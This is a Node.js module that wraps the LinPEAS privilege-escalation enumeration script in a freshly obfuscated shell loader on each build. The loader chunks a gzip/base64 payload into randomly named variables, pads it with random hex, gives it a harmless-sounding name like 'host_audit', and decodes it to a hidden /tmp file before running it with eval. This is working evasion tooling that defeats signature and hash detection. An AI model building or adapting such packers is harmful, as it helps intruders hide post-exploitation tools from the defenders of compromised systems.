/**
 * Polymorphic LinPEAS shell builder — unique wrapper + stamp each generation.
 */
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const {
  randomId,
  readManifest,
  writeManifest,
  BUILDS_DIR,
} = require('./polymorph');

const ROOT = path.join(__dirname, '..');
const LINPEAS_SRC = path.join(ROOT, 'linpeas.sh');

const LINUX_ENUM_NAMES = [
  'host_audit',
  'sys_enum',
  'local_checks',
  'priv_review',
  'linux_scan',
];

function randomIdent(prefix) {
  const n = crypto.randomBytes(4).toString('hex');
  return `${prefix}_${n}`;
}

function chunkString(s, minLen, maxLen) {
  const parts = [];
  let i = 0;
  while (i < s.length) {
    const len = minLen + (crypto.randomBytes(1)[0] % (maxLen - minLen + 1));
    parts.push(s.slice(i, i + len));
    i += len;
  }
  return parts;
}

function buildWrapper(gzB64, stamp) {
  const chunks = chunkString(gzB64, 48, 96);
  const dataVar = randomIdent('d');
  const fnDecode = randomIdent('f');
  const fnRun = randomIdent('r');
  const partVars = chunks.map(() => randomIdent('p'));

  const assigns = partVars.map((v, i) => `${v}='${chunks[i]}'`).join('\n');
  const concat = partVars.map((v) => `\${${v}}`).join('');

  return `#!/bin/sh
# ${stamp}
# ${crypto.randomBytes(24).toString('hex')}
${assigns}
${dataVar}="${concat}"
${fnDecode}() {
  _t=$(mktemp 2>/dev/null || echo "/tmp/.${stamp.slice(0, 8)}")
  printf '%s' "\${${dataVar}}" | tr -d '\\n' | base64 -d 2>/dev/null | gzip -dc 2>/dev/null > "$_t" || return 1
  cat "$_t"
  rm -f "$_t" 2>/dev/null
}
${fnRun}() {
  eval "$(${fnDecode})"
}
${fnRun}
`;
}

function mutateLinpeasSource(text, stamp) {
  let out = text;
  const tag = stamp.slice(0, 12);
  out = out.replace(/VERSION="[^"]*"/, `VERSION="ng_${tag}"`);
  const inject = `# poly_build:${stamp}\n# ${crypto.randomBytes(16).toString('hex')}\n`;
  if (/^#!\/[^\n]*\n/.test(out)) {
    out = out.replace(/^#!\/[^\n]*\n/, (m) => m + inject);
  } else {
    out = inject + out;
  }
  return out;
}

function defaultLinpeasName() {
  const base = LINUX_ENUM_NAMES[crypto.randomBytes(1)[0] % LINUX_ENUM_NAMES.length];
  return `${base}_${crypto.randomBytes(3).toString('hex')}`;
}

async function generateLinpeasBuild(options = {}) {
  if (!fs.existsSync(LINPEAS_SRC)) {
    throw new Error('linpeas.sh not found in project root');
  }

  const id = randomId();
  const stamp = crypto.randomBytes(32).toString('hex');
  const buildid = crypto.randomBytes(16).toString('hex');

  const raw = fs.readFileSync(LINPEAS_SRC, 'utf8');
  const mutated = mutateLinpeasSource(raw, stamp);
  const gz = zlib.gzipSync(Buffer.from(mutated, 'utf8'), { level: 9 });
  const gzB64 = gz.toString('base64');

  let wrapper = buildWrapper(gzB64, stamp);
  wrapper += `\n# tail:${crypto.randomBytes(128 + (crypto.randomBytes(1)[0] % 384)).toString('hex')}\n`;

  const workDir = path.join(BUILDS_DIR, id);
  fs.mkdirSync(workDir, { recursive: true });

  const baseName = (options.outputName || defaultLinpeasName()).replace(/[<>:"/\\|?*\s]/g, '_');
  const outName = baseName.endsWith('.sh') ? baseName : `${baseName}.sh`;
  const outPath = path.join(workDir, outName);

  fs.writeFileSync(outPath, wrapper, { mode: 0o755 });

  const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');
  const stat = fs.statSync(outPath);

  const meta = {
    id,
    platform: 'linux',
    arch: String(options.arch || 'amd64'),
    variant: 'linpeas',
    tool: 'linpeas-sh',
    format: 'sh',
    fileName: outName,
    size: stat.size,
    sha256,
    stamp: stamp.slice(0, 16),
    buildid,
    sourceBytes: Buffer.byteLength(mutated, 'utf8'),
    gzipBytes: gz.length,
    injectDllPacked: false,
    createdAt: new Date().toISOString(),
  };

  fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
  const list = readManifest();
  list.unshift(meta);
  writeManifest(list.slice(0, 100));
  return meta;
}

module.exports = { generateLinpeasBuild };
